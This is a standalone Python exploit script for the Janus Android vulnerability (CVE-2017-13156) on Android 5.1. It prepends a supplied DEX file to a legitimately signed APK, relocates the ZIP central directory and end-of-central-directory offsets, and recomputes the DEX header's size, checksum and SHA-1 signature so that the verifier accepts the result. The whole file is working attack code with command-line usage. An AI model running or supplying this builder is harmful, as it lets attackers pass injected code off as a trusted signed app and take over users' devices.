#!/usr/bin/env python3
"""
Janus (CVE-2017-13156) APK constructor v2 for Android 5.1
Fixes DEX file_size to match total APK size so dalvik verifier passes.
"""
import struct
import hashlib
import zlib
import sys

def compute_adler32(data):
    """Compute Adler32 checksum."""
    return zlib.adler32(data) & 0xffffffff

def build_janus_v2(original_apk_path, dex_path, output_path):
    with open(original_apk_path, 'rb') as f:
        original = f.read()
    
    with open(dex_path, 'rb') as f:
        dex = f.read()
    
    dex_size = len(dex)
    original_size = len(original)
    total_size = dex_size + original_size
    
    print(f"[INFO] DEX: {dex_size}, Original APK: {original_size}, Total: {total_size}")
    
    # Verify DEX magic
    if dex[:4] != b'dex\n':
        raise ValueError("Not a valid DEX file")
    
    # Find EOCD
    eocd_sig = b'\x50\x4b\x05\x06'
    eocd_pos = original.rfind(eocd_sig)
    if eocd_pos == -1:
        raise ValueError("EOCD not found")
    
    cd_offset = struct.unpack('<I', original[eocd_pos+16:eocd_pos+20])[0]
    cd_size = struct.unpack('<I', original[eocd_pos+12:eocd_pos+16])[0]
    
    # Modify EOCD: update CD offset
    new_cd_offset = cd_offset + dex_size
    modified_eocd = (
        original[:eocd_pos+16] +
        struct.pack('<I', new_cd_offset) +
        original[eocd_pos+20:]
    )
    
    # Modify Central Directory
    cd_data = original[cd_offset:cd_offset + cd_size]
    modified_cd = bytearray(cd_data)
    
    pos = 0
    entry_count = 0
    while pos < len(cd_data):
        if cd_data[pos:pos+4] != b'\x50\x4b\x01\x02':
            pos += 1
            continue
        
        entry_count += 1
        filename_len = struct.unpack('<H', cd_data[pos+28:pos+30])[0]
        extra_len = struct.unpack('<H', cd_data[pos+30:pos+32])[0]
        comment_len_entry = struct.unpack('<H', cd_data[pos+32:pos+34])[0]
        
        old_offset = struct.unpack('<I', cd_data[pos+42:pos+46])[0]
        new_offset = old_offset + dex_size
        modified_cd[pos+42:pos+46] = struct.pack('<I', new_offset)
        
        header_size = 46 + filename_len + extra_len + comment_len_entry
        pos += header_size
    
    print(f"[INFO] Modified {entry_count} CD entries")
    
    # Build APK body (DEX + ZIP local data + modified CD + modified EOCD)
    apk_body = dex + original[:cd_offset] + bytes(modified_cd) + modified_eocd[eocd_pos:]
    
    # Fix DEX header: file_size = total APK size
    apk = bytearray(apk_body)
    
    # file_size at offset 32
    apk[32:36] = struct.pack('<I', len(apk))
    
    # Recompute checksum (Adler32 of bytes 12..end)
    checksum = compute_adler32(apk[12:])
    apk[8:12] = struct.pack('<I', checksum)
    
    # Recompute signature (SHA-1 of bytes 32..end)
    signature = hashlib.sha1(apk[32:]).digest()
    apk[12:32] = signature
    
    # Recompute checksum again because signature changed
    checksum = compute_adler32(apk[12:])
    apk[8:12] = struct.pack('<I', checksum)
    
    with open(output_path, 'wb') as f:
        f.write(apk)
    
    # Verify
    with open(output_path, 'rb') as f:
        verify = f.read(36)
        fs = struct.unpack('<I', verify[32:36])[0]
        chk = struct.unpack('<I', verify[8:12])[0]
        print(f"[VERIFY] DEX file_size: {fs}, checksum: 0x{chk:08x}")
    
    # Verify ZIP
    import subprocess
    result = subprocess.run(['unzip', '-t', output_path], capture_output=True, text=True)
    if result.returncode == 0:
        print(f"[VERIFY] ZIP structure OK")
    else:
        print(f"[WARN] ZIP test failed: {result.stderr[:100]}")
    
    print(f"[SUCCESS] Janus v2 APK: {output_path} ({len(apk)} bytes)")

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print(f"Usage: python3 {sys.argv[0]} <original.apk> <classes.dex> <output.apk>")
        sys.exit(1)
    build_janus_v2(sys.argv[1], sys.argv[2], sys.argv[3])
